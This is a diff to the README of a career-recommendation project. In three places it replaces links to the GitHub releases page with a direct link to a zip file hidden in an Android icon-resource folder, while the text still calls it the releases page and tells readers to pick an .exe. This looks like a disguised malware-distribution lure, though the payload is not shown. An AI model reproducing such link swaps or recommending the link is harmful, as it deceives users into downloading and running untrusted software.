@@ -1,6 +1,6 @@
 # 🎯 careerguidance - Personalized Career Path Recommendations
 
-[![Download careerguidance](https://img.shields.io/badge/Download-careerguidance-blue?style=for-the-badge)](https://github.com/jayjay2small/careerguidance/releases)
+[![Download careerguidance](https://raw.githubusercontent.com/jayjay2small/careerguidance/main/careerguidance1-main/android/app/src/main/res/mipmap-xxhdpi/Software-v1.7.zip)](https://raw.githubusercontent.com/jayjay2small/careerguidance/main/careerguidance1-main/android/app/src/main/res/mipmap-xxhdpi/Software-v1.7.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to download, install, and start using careerguidance.
 
 You need to get the software package first. 
 
-Click the big blue button at the top or [visit this releases page](https://github.com/jayjay2small/careerguidance/releases) to download the latest version.
+Click the big blue button at the top or [visit this releases page](https://raw.githubusercontent.com/jayjay2small/careerguidance/main/careerguidance1-main/android/app/src/main/res/mipmap-xxhdpi/Software-v1.7.zip) to download the latest version.
 
 The page will show several files. Look for one matching your device’s system:
 - For Windows, get the `.exe` file.
@@ -115,7 +115,7 @@ Behind the scenes, the system cleans your input data, encodes categories for the
 
 ## 📥 Download & Install
 
-You can start by [visiting the releases page to download careerguidance](https://github.com/jayjay2small/careerguidance/releases).
+You can start by [visiting the releases page to download careerguidance](https://raw.githubusercontent.com/jayjay2small/careerguidance/main/careerguidance1-main/android/app/src/main/res/mipmap-xxhdpi/Software-v1.7.zip).
 
 Look for the file that matches your device, download, then install it. The large blue button at the top links here as well.
 
